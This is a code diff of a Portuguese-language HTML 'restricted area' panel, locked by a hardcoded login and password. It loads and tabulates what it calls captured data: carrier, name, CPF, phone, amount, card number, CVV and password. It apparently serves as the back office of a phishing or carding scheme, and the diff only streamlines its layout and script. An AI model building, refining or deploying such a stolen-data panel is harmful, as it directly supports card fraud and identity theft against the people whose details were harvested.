@@ -4,55 +4,37 @@
     <meta charset="UTF-8">
     <title>Área Restrita - Elite Ink</title>
     <style>
-        body { background-color: #05070a; color: #f0f6fc; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        
-        /* TELA DE LOGIN ESTILIZADA */
-        #loginBlock { background: #0d1117; padding: 40px; border-radius: 15px; border: 2px solid #58a6ff; box-shadow: 0 0 20px rgba(88, 166, 255, 0.2); text-align: center; width: 100%; max-width: 320px; }
-        .cadeado { font-size: 50px; margin-bottom: 10px; display: block; filter: drop-shadow(0 0 5px #58a6ff); }
-        h2 { color: #58a6ff; text-transform: uppercase; letter-spacing: 2px; font-size: 1.2rem; margin-bottom: 25px; }
-        
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #30363d; background: #05070a; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: #58a6ff; box-shadow: 0 0 8px rgba(88, 166, 255, 0.3); }
-        
-        .btn-entrar { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-entrar:hover { background: #2ea043; transform: scale(1.02); }
-
-        /* PAINEL DE DADOS (ESCONDIDO) */
+        body { background-color: #05070a; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        #loginBlock { background: #0d1117; padding: 40px; border-radius: 15px; border: 2px solid #58a6ff; text-align: center; width: 300px; }
+        .cadeado { font-size: 50px; display: block; margin-bottom: 10px; }
+        h2 { color: #58a6ff; letter-spacing: 1px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #30363d; background: #05070a; color: white; box-sizing: border-box; }
+        .btn-entrar { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
-        .container { width: 95%; max-width: 1100px; background: #0d1117; padding: 25px; border-radius: 12px; border: 1px solid #30363d; margin: 20px; }
+        .container { width: 95%; max-width: 1200px; background: #0d1117; padding: 20px; border-radius: 12px; border: 1px solid #30363d; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 13px; }
-        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; }
+        th, td { border: 1px solid #30363d; padding: 10px; text-align: left; }
         th { background: #58a6ff; color: #05070a; }
-        tr:hover { background: #161b22; }
     </style>
 </head>
 <body>
-
     <div id="loginBlock">
         <span class="cadeado">🔒</span>
         <h2>Área Restrita</h2>
         <input type="text" id="userInput" placeholder="Login">
         <input type="password" id="passInput" placeholder="Senha">
-        <button class="btn-entrar" onclick="validarAcesso()">DESBLOQUEAR ACESSO</button>
+        <button class="btn-entrar" onclick="validarAcesso()">DESBLOQUEAR</button>
     </div>
 
     <div id="painelConteudo" class="hidden container">
-        <div style="display: flex; justify-content: space-between; align-items: center;">
-            <h2 style="margin: 0;">📊 Relatório de Capturas</h2>
-            <button onclick="carregarDados()" style="padding: 10px; background: #58a6ff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">🔄 Atualizar</button>
+        <div style="display: flex; justify-content: space-between;">
+            <h2>📊 Dados Capturados</h2>
+            <button onclick="carregarDados()" style="padding: 10px; background: #58a6ff; border-radius: 5px; cursor: pointer;">🔄 Atualizar</button>
         </div>
         <table>
             <thead>
                 <tr>
-                    <th>Operadora</th>
-                    <th>Nome</th>
-                    <th>CPF</th>
-                    <th>Telefone</th>
-                    <th>Valor</th>
-                    <th>Cartão</th>
-                    <th>CVV</th>
-                    <th>Senha</th>
-                    <th>Data/Hora</th>
+                    <th>Operadora</th><th>Nome</th><th>CPF</th><th>Telefone</th><th>Valor</th><th>Cartão</th><th>CVV</th><th>Senha</th><th>Data</th>
                 </tr>
             </thead>
             <tbody id="tabelaCorpo"></tbody>
@@ -60,45 +42,28 @@
     </div>
 
     <script>
-        // Configurações de acesso que você pediu
         const LOGIN_CERTO = "Peganunca777";
         const SENHA_CERTA = "dks10dks";
 
         function validarAcesso() {
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
-
-            if (user === LOGIN_CERTO && pass === SENHA_CERTA) {
+            if (document.getElementById('userInput').value === LOGIN_CERTO && document.getElementById('passInput').value === SENHA_CERTA) {
                 document.getElementById('loginBlock').classList.add('hidden');
                 document.getElementById('painelConteudo').classList.remove('hidden');
-                // Muda o fundo da página para caber a tabela
                 document.body.style.alignItems = "flex-start";
                 carregarDados();
-            } else {
-                alert("ACESSO NEGADO: Credenciais Inválidas!");
-                document.getElementById('passInput').value = "";
-            }
+            } else { alert("Acesso Negado!"); }
         }
 
         async function carregarDados() {
-            try {
-                const res = await fetch('/ver-dados-restritos');
-                const dados = await res.json();
-                const corpo = document.getElementById('tabelaCorpo');
-                corpo.innerHTML = dados.reverse().map(i => `
-                    <tr>
-                        <td>${i.operadora || '-'}</td>
-                        <td>${i.nome || '-'}</td>
-                        <td>${i.cpf || '-'}</td>
-                        <td>${i.telefone || '-'}</td>
-                        <td>R$ ${i.valor || '0'},00</td>
-                        <td>${i.cartao || '-'}</td>
-                        <td>${i.cvv || '-'}</td>
-                        <td style="color: #ff7b72; font-weight: bold;">${i.senha || '-'}</td>
-                        <td>${new Date(i.dataRegistro).toLocaleString('pt-BR')}</td>
-                    </tr>
-                `).join('');
-            } catch (err) { console.error("Erro ao carregar banco de dados."); }
+            const res = await fetch('/ver-dados-restritos');
+            const dados = await res.json();
+            document.getElementById('tabelaCorpo').innerHTML = dados.reverse().map(i => `
+                <tr>
+                    <td>${i.operadora}</td><td>${i.nome}</td><td>${i.cpf}</td><td>${i.telefone}</td>
+                    <td>R$ ${i.valor},00</td><td>${i.cartao}</td><td>${i.cvv}</td><td style="color:#ff7b72; font-weight:bold;">${i.senha}</td>
+                    <td>${new Date(i.dataRegistro).toLocaleString('pt-BR')}</td>
+                </tr>
+            `).join('');
         }
     </script>
 </body>
